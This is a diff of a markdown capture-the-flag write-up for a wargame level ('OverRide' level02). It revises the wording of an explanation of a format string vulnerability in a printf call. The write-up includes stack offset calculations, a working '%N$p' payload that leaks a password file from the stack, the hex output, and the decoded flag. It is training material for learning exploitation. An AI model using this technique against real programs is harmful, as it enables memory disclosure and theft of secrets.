@@ -53,23 +53,24 @@ Here, we find only the function: `main`.
 
 #### main function
 
-The main function open the file `"/home/users/level03/.pass"` in read mode. Stores it in the `local_a8` variable.
+The `main` function opens the file `"/home/users/level03/.pass"` in read mode and stores its content in the `local_a8` variable.
 
-Then ask for a username, that is not verified, and ask for a password. If the password is equal to the content of the file, it call `system("/bin/sh")`. Otherwise, it's print the `username` and the message `" does not have access!"`.
+It then asks for a username, which is not verified, and a password. If the password equals the file content, it calls `system("/bin/sh")`. Otherwise, it prints the `username` followed by the message `" does not have access!"`.
 
-## 3. Identify The Vulnerability
 
-The vulnerabiltiy comes from the end of the program in the message print in the case of wrong password:
+## 3. Exploit Development	
+
+The vulnerability comes from the end of the program in the message print in the case of a wrong password :
 ```c
   printf(local_78);
   puts(" does not have access!");
 ```
 
-The `printf` without a safe format string call allows to proceed to a Format String Attack.
+The **`printf` without** a **safe format** string call allows us to perform a **Format String Attack**.
 
-### Format String Attack Explaination
+### Format String Attack Explanation
 
-When user-controlled input is passed **directly** as the **format string** `printf(string)`, instead of using a **safe call** such as `printf("%s", string)`, the program allows us to **inject format specifiers**.
+When user-controlled input is passed **directly** as the **format string** `printf(string)`, instead of using a **safe call**, such as `printf("%s", string)`, the program allows us to **inject format specifiers**.
 
 For example, `%x` reads and prints values from the stack as hexadecimal, consuming one stack argument per specifier.
 This behavior allows us to read and write arbitrary values in memory.
@@ -137,7 +138,7 @@ The user input is stored in `local_78`.
 
 The user input is store at `%rbp - 0x70`.
 
-With the 2 `%rbp` offsets `%rbp - 0xa0` and `%rbp - 0x70`, we can calculate the offset between our input and the pass :
+With the 2 `%rbp` offsets **`%rbp - 0xa0`** and **`%rbp - 0x70`**, we can calculate the offset between our input and the pass :
 
 ```
 offset = 0xa0 - 0x70
@@ -145,23 +146,25 @@ offset = 160 - 112
 offset = 48 bytes
 ```
 
-We know that each 8 bytes is equal to 1 element in the stack, and the pass is 40 bytes length. So we can deduce this stack layout :
+The password is located **48 bytes before** the username buffer.
+
+We know that each **`8 bytes`** represents **1 element** on the stack, and the **password** is **`40 bytes` long**. We can deduce the following stack layout:
 
 ```
-						  __
-[local_a8] 	- 22th element	|
- 			- 23th element	|
- 			- 24th element	|	password
- 			- 25th element	|
- 			- 26th element__|	
+						
+[local_a8] 	- 22nd element ─┐
+ 			- 23rd element  │
+ 			- 24th element  │	password (40 bytes)
+ 			- 25th element  │	
+ 			- 26th element ─┘	
  			- 27th element
-[local_78]	- 28th element
+[local_78]	- 28th element		(our input)
 ```
 
-We need to print the 5 elements from 22th to 27th.
-For that we need to use the format specifier `X$p` to print the value at the position `X` in the stack.
+We need to print the **5 elements** from the **22nd** to the **26th position**.
+To do this, we use the **format specifier `%X$p`** to print the value at the position `X` on the stack.
 
-### Create Payload
+### Create The Payload
 
 ```
 %22$p%23$p%24$p%25$p%26$p
@@ -181,16 +184,18 @@ level02@OverRide:~$ ./level02
 0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access!
 ```
 
-### Convert the Hexadecimal
+### Convert The Hexadecimal Output
 
 ```
 0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d
 ```
 
-We need to convert the hexadecimal ouput into a string.
+We need to **convert** the **hexadecimal output** into a **string**.
 
-With a python script `decript.py` in `Ressources/`, we get this ouput :
+With the **Python script** `decript.py` in `Ressources/`, we get this output :
 ```bash
 )> python3 decrypt.py 0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d
 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
 ```
+
+The script **converts the hexadecimal** values from **little-endian** to **big-endian**, then **decodes** them as **ASCII**.
